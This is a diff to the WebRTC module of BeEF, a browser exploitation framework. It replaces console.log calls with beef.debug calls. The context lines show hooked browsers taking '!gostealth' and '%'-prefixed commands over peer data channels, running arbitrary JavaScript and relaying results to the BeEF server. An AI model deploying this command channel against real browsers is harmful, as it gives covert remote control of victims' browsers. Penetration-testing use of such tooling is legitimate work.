@@ -96,7 +96,7 @@ Beefwebrtc.prototype.forceTurn = function(jason) {
     if (iceServers !== null) {
         this.pcConfig.iceServers = this.pcConfig.iceServers.concat(iceServers);
     }
-    if (this.verbose) {console.log("Got TURN servers, will try and maybestart again..");}
+    if (this.verbose) {beef.debug("Got TURN servers, will try and maybestart again..");}
     this.turnDone = true;
     this.maybeStart();
 }
@@ -104,7 +104,7 @@ Beefwebrtc.prototype.forceTurn = function(jason) {
 // Try and establish the RTC connection
 Beefwebrtc.prototype.createPeerConnection = function() {
   if (this.verbose) {
-      console.log('Creating RTCPeerConnnection with the following options:\n' +
+      beef.debug('Creating RTCPeerConnnection with the following options:\n' +
                 '  config: \'' + JSON.stringify(this.pcConfig) + '\';\n' +
                 '  constraints: \'' + JSON.stringify(this.pcConstraints) + '\'.');
     }
@@ -113,14 +113,14 @@ Beefwebrtc.prototype.createPeerConnection = function() {
     globalrtc[this.peerid] = new RTCPeerConnection(this.pcConfig, this.pcConstraints);
     globalrtc[this.peerid].onicecandidate = this.onIceCandidate;
     if (this.verbose) {
-      console.log('Created RTCPeerConnnection with the following options:\n' +
+      beef.debug('Created RTCPeerConnnection with the following options:\n' +
                 '  config: \'' + JSON.stringify(this.pcConfig) + '\';\n' +
                 '  constraints: \'' + JSON.stringify(this.pcConstraints) + '\'.');
     }
   } catch (e) {
     if (this.verbose) {
-      console.log('Failed to create PeerConnection, exception: ');
-      console.log(e);
+      beef.debug('Failed to create PeerConnection, exception: ');
+      beef.debug(e);
     }
     return;
   }
@@ -143,8 +143,8 @@ Beefwebrtc.prototype.onIceCandidate = function(event) {
   }
 
   if (beefrtcs[peerid].verbose) {
-    console.log("Handling onicecandidate event while connecting to peer: " + peerid + ". Event received:");
-    console.log(event);
+    beef.debug("Handling onicecandidate event while connecting to peer: " + peerid + ". Event received:");
+    beef.debug(event);
   }
 
   if (event.candidate) {
@@ -156,7 +156,7 @@ Beefwebrtc.prototype.onIceCandidate = function(event) {
     // Note this ICE candidate locally
     beefrtcs[peerid].noteIceCandidate("Local", beefrtcs[peerid].iceCandidateType(event.candidate.candidate));
   } else {
-    if (beefrtcs[peerid].verbose) {console.log('End of candidates.');}
+    if (beefrtcs[peerid].verbose) {beef.debug('End of candidates.');}
   }
 }
 
@@ -165,25 +165,25 @@ Beefwebrtc.prototype.onIceCandidate = function(event) {
 // against the message directly
 Beefwebrtc.prototype.processMessage = function(message) {
   if (this.verbose) {
-    console.log('Signalling Message - S->C: ' + JSON.stringify(message));
+    beef.debug('Signalling Message - S->C: ' + JSON.stringify(message));
   }
   var msg = JSON.parse(message);
 
   if (!this.initiator && !this.started) { // We are currently the receiver AND we have NOT YET received an SDP Offer
-    if (this.verbose) {console.log('processing the message, as a receiver');}
+    if (this.verbose) {beef.debug('processing the message, as a receiver');}
     if (msg.type === 'offer') { // This IS an SDP Offer
-      if (this.verbose) {console.log('.. and the message is an offer .. ');}
+      if (this.verbose) {beef.debug('.. and the message is an offer .. ');}
       this.msgQueue.unshift(msg); // put it on the top of the msgqueue
       this.signalingReady = true; // As the receiver, we've now got an SDP Offer, so lets set signalingReady to true
       this.maybeStart(); // Lets try and start again - this will end up with calleeStart() getting executed
     } else { // This is NOT an SDP Offer - as the receiver, just add it to the queue
-      if (this.verbose) {console.log(' .. the message is NOT an offer .. ');}
+      if (this.verbose) {beef.debug(' .. the message is NOT an offer .. ');}
       this.msgQueue.push(msg);
     }
   } else if (this.initiator && !this.gotanswer) { // We are currently the caller AND we have NOT YET received the SDP Answer
-    if (this.verbose) {console.log('processing the message, as the sender, no answers yet');}
+    if (this.verbose) {beef.debug('processing the message, as the sender, no answers yet');}
     if (msg.type === 'answer') { // This IS an SDP Answer
-        if (this.verbose) {console.log('.. and we have an answer ..');}
+        if (this.verbose) {beef.debug('.. and we have an answer ..');}
         this.processSignalingMessage(msg); // Process the message directly
         this.gotanswer = true; // We have now received an answer
         //process all other queued message...
@@ -191,11 +191,11 @@ Beefwebrtc.prototype.processMessage = function(message) {
             this.processSignalingMessage(this.msgQueue.shift());
         }
     } else { // This is NOT an SDP Answer - as the caller, just add it to the queue
-        if (this.verbose) {console.log('.. not an answer ..');}
+        if (this.verbose) {beef.debug('.. not an answer ..');}
         this.msgQueue.push(msg);
     }
   } else { // For all other messages just drop them in the queue
-    if (this.verbose) {console.log('processing a message, but, not as a receiver, OR, the rtc is already up');}
+    if (this.verbose) {beef.debug('processing a message, but, not as a receiver, OR, the rtc is already up');}
     this.processSignalingMessage(msg);
   } 
 }
@@ -203,7 +203,7 @@ Beefwebrtc.prototype.processMessage = function(message) {
 // Send a signalling message .. 
 Beefwebrtc.prototype.sendSignalMsg = function(message) {
   var msgString = JSON.stringify(message);
-  if (this.verbose) {console.log('Signalling Message - C->S: ' + msgString);}
+  if (this.verbose) {beef.debug('Signalling Message - C->S: ' + msgString);}
   beef.net.send('/rtcsignal',0,{targetbeefid: this.peerid, signal: msgString});
 }
 
@@ -225,7 +225,7 @@ Beefwebrtc.prototype.onSignalingStateChanged = function(event) {
     }
   }
 
-  if (localverbose === true) {console.log("Signalling has changed to: " + event.target.signalingState);}
+  if (localverbose === true) {beef.debug("Signalling has changed to: " + event.target.signalingState);}
 }
 
 // When the ICE Connection State changes - this is useful to determine connection statuses with peers.
@@ -238,7 +238,7 @@ Beefwebrtc.prototype.onIceConnectionStateChanged = function(event) {
     }
   }
 
-  if (beefrtcs[peerid].verbose) {console.log("ICE with peer: " + peerid + " has changed to: " + event.target.iceConnectionState);}
+  if (beefrtcs[peerid].verbose) {beef.debug("ICE with peer: " + peerid + " has changed to: " + event.target.iceConnectionState);}
 
   // ICE Connection Status has connected - this is good. Normally means the RTCPeerConnection is ready! Although may still look for 
   // better candidates or connections
@@ -292,7 +292,7 @@ rtcpollPeer = function() {
         return;
     }
 
-    if (beefrtcs[rtcstealth].verbose) {console.log('lub dub');}
+    if (beefrtcs[rtcstealth].verbose) {beef.debug('lub dub');}
 
     beefrtcs[rtcstealth].sendPeerMsg('Stayin alive'); // This is the heartbeat we send back to the peer that made us stealth
 
@@ -308,12 +308,12 @@ Beefwebrtc.prototype.onDataChannel = function(event) {
     }
   }
 
-  if (beefrtcs[peerid].verbose) {console.log("Peer: " + peerid + " has just handled the onDataChannel event");}
+  if (beefrtcs[peerid].verbose) {beef.debug("Peer: " + peerid + " has just handled the onDataChannel event");}
   rtcrecvchan[peerid] = event.channel;
 
   // This is the onmessage event handling within the datachannel
   rtcrecvchan[peerid].onmessage = function(ev2) {
-    if (beefrtcs[peerid].verbose) {console.log("Received an RTC message from my peer["+peerid+"]: " + ev2.data);}
+    if (beefrtcs[peerid].verbose) {beef.debug("Received an RTC message from my peer["+peerid+"]: " + ev2.data);}
 
     // We've received the command to go into stealth mode
     if (ev2.data == "!gostealth") {
@@ -333,22 +333,22 @@ Beefwebrtc.prototype.onDataChannel = function(event) {
 
     // Command to perform arbitrary JS (while stealthed)
     } else if ((rtcstealth != false) && (ev2.data.charAt(0) == "%")) {
-      if (beefrtcs[peerid].verbose) {console.log('message was a command: '+ev2.data.substring(1) + ' .. and I am in stealth mode');}
+      if (beefrtcs[peerid].verbose) {beef.debug('message was a command: '+ev2.data.substring(1) + ' .. and I am in stealth mode');}
       beefrtcs[rtcstealth].sendPeerMsg("Command result - " + beefrtcs[rtcstealth].execCmd(ev2.data.substring(1)));
 
     // Command to perform arbitrary JS (while NOT stealthed)
     } else if ((rtcstealth == false) && (ev2.data.charAt(0) == "%")) {
-      if (beefrtcs[peerid].verbose) {console.log('message was a command - we are not in stealth. Command: '+ ev2.data.substring(1));}
+      if (beefrtcs[peerid].verbose) {beef.debug('message was a command - we are not in stealth. Command: '+ ev2.data.substring(1));}
       beefrtcs[peerid].sendPeerMsg("Command result - " + beefrtcs[peerid].execCmd(ev2.data.substring(1)));
 
     // Just a plain text message .. (while stealthed)
     } else if (rtcstealth != false) {
-      if (beefrtcs[peerid].verbose) {console.log('received a message, apparently we are in stealth - so just send it back to peer['+rtcstealth+']');}
+      if (beefrtcs[peerid].verbose) {beef.debug('received a message, apparently we are in stealth - so just send it back to peer['+rtcstealth+']');}
       beefrtcs[rtcstealth].sendPeerMsg(ev2.data);
 
     // Just a plan text message (while NOT stealthed)
     } else {
-      if (beefrtcs[peerid].verbose) {console.log('received a message from peer['+peerid+'] - sending it back to beef');}
+      if (beefrtcs[peerid].verbose) {beef.debug('received a message from peer['+peerid+'] - sending it back to beef');}
       beef.net.send('/rtcmessage',0,{peerid: peerid, message: ev2.data});
     }
   } 
@@ -363,30 +363,30 @@ Beefwebrtc.prototype.execCmd = function(input) {
 
 // Shortcut function to SEND a data messsage
 Beefwebrtc.prototype.sendPeerMsg = function(msg) {
-  if (this.verbose) {console.log('sendPeerMsg to ' + this.peerid);}
+  if (this.verbose) {beef.debug('sendPeerMsg to ' + this.peerid);}
   this.dataChannel.send(msg);
 }
 
 // Try and initiate, will check that system hasn't started, and that signaling is ready, and that TURN servers are ready
 Beefwebrtc.prototype.maybeStart = function() {
-  if (this.verbose) {console.log("maybe starting ... ");}
+  if (this.verbose) {beef.debug("maybe starting ... ");}
 
   if (!this.started && this.signalingReady && this.turnDone) {
-    if (this.verbose) {console.log('Creating PeerConnection.');}
+    if (this.verbose) {beef.debug('Creating PeerConnection.');}
     this.createPeerConnection();
 
     this.started = true;
 
     if (this.initiator) {
-      if (this.verbose) {console.log("Making the call now .. bzz bzz");}
+      if (this.verbose) {beef.debug("Making the call now .. bzz bzz");}
       this.doCall();
     } else {
-      if (this.verbose) {console.log("Receiving a call now .. somebuddy answer da fone?");}
+      if (this.verbose) {beef.debug("Receiving a call now .. somebuddy answer da fone?");}
       this.calleeStart();
     }
 
   } else {
-    if (this.verbose) {console.log("Not ready to start just yet..");}
+    if (this.verbose) {beef.debug("Not ready to start just yet..");}
   }
 }
 
@@ -395,7 +395,7 @@ Beefwebrtc.prototype.doCall = function() {
   var constraints = this.mergeConstraints(this.offerConstraints, this.sdpConstraints);
   var self = this;
   globalrtc[this.peerid].createOffer(this.setLocalAndSendMessage, this.onCreateSessionDescriptionError, constraints);
-  if (this.verbose) {console.log('Sending offer to peer, with constraints: \n' +
+  if (this.verbose) {beef.debug('Sending offer to peer, with constraints: \n' +
               '  \'' + JSON.stringify(constraints) + '\'.');}
 }
 
@@ -424,17 +424,17 @@ Beefwebrtc.prototype.setLocalAndSendMessage = function(sessionDescription) {
       peerid = beefrtcs[k].peerid;
     }
   }
-  if (beefrtcs[peerid].verbose) {console.log("For peer: " + peerid + " Running setLocalAndSendMessage...");}
+  if (beefrtcs[peerid].verbose) {beef.debug("For peer: " + peerid + " Running setLocalAndSendMessage...");}
 
   globalrtc[peerid].setLocalDescription(sessionDescription, onSetSessionDescriptionSuccess, onSetSessionDescriptionError);
   beefrtcs[peerid].sendSignalMsg(sessionDescription);
 
   function onSetSessionDescriptionSuccess() {
-    if (beefrtcs[peerid].verbose) {console.log('Set session description success.');}
+    if (beefrtcs[peerid].verbose) {beef.debug('Set session description success.');}
   }
 
   function onSetSessionDescriptionError() {
-    if (beefrtcs[peerid].verbose) {console.log('Failed to set session description');}
+    if (beefrtcs[peerid].verbose) {beef.debug('Failed to set session description');}
   }
 }
 
@@ -447,7 +447,7 @@ Beefwebrtc.prototype.onCreateSessionDescriptionError = function(error) {
       localverbose = true;
     }
   }
-  if (localverbose === true) {console.log('Failed to create session description: ' + error.toString());}
+  if (localverbose === true) {beef.debug('Failed to create session description: ' + error.toString());}
 }
 
 // Check for messages - which includes signaling from a calling peer - this gets kicked off in maybeStart()
@@ -461,19 +461,19 @@ Beefwebrtc.prototype.calleeStart = function() {
 // Process messages, this is how we handle the signaling messages, such as candidate info, offers, answers
 Beefwebrtc.prototype.processSignalingMessage = function(message) {
   if (!this.started) {
-    if (this.verbose) {console.log('peerConnection has not been created yet!');}
+    if (this.verbose) {beef.debug('peerConnection has not been created yet!');}
     return;
   }
 
   if (message.type === 'offer') {
-    if (this.verbose) {console.log("Processing signalling message: OFFER");}
+    if (this.verbose) {beef.debug("Processing signalling message: OFFER");}
     this.setRemote(message);
     this.doAnswer();
   } else if (message.type === 'answer') {
-    if (this.verbose) {console.log("Processing signalling message: ANSWER");}
+    if (this.verbose) {beef.debug("Processing signalling message: ANSWER");}
     this.setRemote(message);
   } else if (message.type === 'candidate') {
-    if (this.verbose) {console.log("Processing signalling message: CANDIDATE");}
+    if (this.verbose) {beef.debug("Processing signalling message: CANDIDATE");}
     var candidate = new RTCIceCandidate({sdpMLineIndex: message.label,
                                          candidate: message.candidate});
     this.noteIceCandidate("Remote", this.iceCandidateType(message.candidate));
@@ -489,13 +489,13 @@ Beefwebrtc.prototype.setRemote = function(message) {
        onSetRemoteDescriptionSuccess, this.onSetSessionDescriptionError);
 
   function onSetRemoteDescriptionSuccess() {
-    if (this.verbose) {console.log("Set remote session description success.");}
+    if (this.verbose) {beef.debug("Set remote session description success.");}
   }
 }
 
 // As part of the processSignalingMessage function, we check for 'offers' from peers. If there's an offer, we answer, as below
 Beefwebrtc.prototype.doAnswer = function() {
-  if (this.verbose) {console.log('Sending answer to peer.');}
+  if (this.verbose) {beef.debug('Sending answer to peer.');}
   globalrtc[this.peerid].createAnswer(this.setLocalAndSendMessage, this.onCreateSessionDescriptionError, this.sdpConstraints);
 }
 
@@ -519,7 +519,7 @@ Beefwebrtc.prototype.onAddIceCandidateSuccess = function() {
       localverbose = true;
     }
   }
-  if (localverbose === true) {console.log('AddIceCandidate success.');}
+  if (localverbose === true) {beef.debug('AddIceCandidate success.');}
 }
 
 // Event handler for unsuccessful addition of ICE Candidates
@@ -531,12 +531,12 @@ Beefwebrtc.prototype.onAddIceCandidateError = function(error) {
       localverbose = true;
     }
   }
-  if (localverbose === true) {console.log('Failed to add Ice Candidate: ' + error.toString());}
+  if (localverbose === true) {beef.debug('Failed to add Ice Candidate: ' + error.toString());}
 }
 
 // If a peer hangs up (we bring down the peerconncetion via the stop() method)
 Beefwebrtc.prototype.onRemoteHangup = function() {
-  if (this.verbose) {console.log('Session terminated.');}
+  if (this.verbose) {beef.debug('Session terminated.');}
   this.initiator = 0;
   // transitionToWaiting();
   this.stop();
